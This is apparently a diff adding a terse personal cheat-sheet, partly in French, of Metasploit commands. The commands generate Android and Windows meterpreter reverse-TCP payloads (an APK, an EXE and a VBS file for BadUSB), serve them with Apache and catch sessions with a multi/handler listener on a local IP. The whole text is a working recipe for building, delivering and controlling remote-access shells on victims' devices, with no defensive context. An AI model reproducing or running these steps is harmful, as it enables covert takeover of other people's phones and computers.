@@ -1,0 +1,42 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=4444 R> /home/kali/Desktop/laplideouf.apk
+service apache2 start
+service apache2 status
+*-new windows-*
+msfconsole
+use multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.1.18
+set LPORT 4444
+exploit 
+background
+envoyer sur android
+bingo
+---------------------
+sessions
+sessions -i numero
+
+
+
+
+
+
+
+
+
+------windows--------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=4444 -f exe -o kali.exe
+-----------------------
+service apache2 start
+----------------------
+msfconsole
+----------------------
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.18
+set LPORT 4444
+exploit
+
+
+
+----------------windowsbadusb---------------------
+msfvenom -p windows/meterpreter/reverse_tcp -f vbs --smallest LHOST=192.168.1.18 LPORT=4444 -o filepayloads.txt
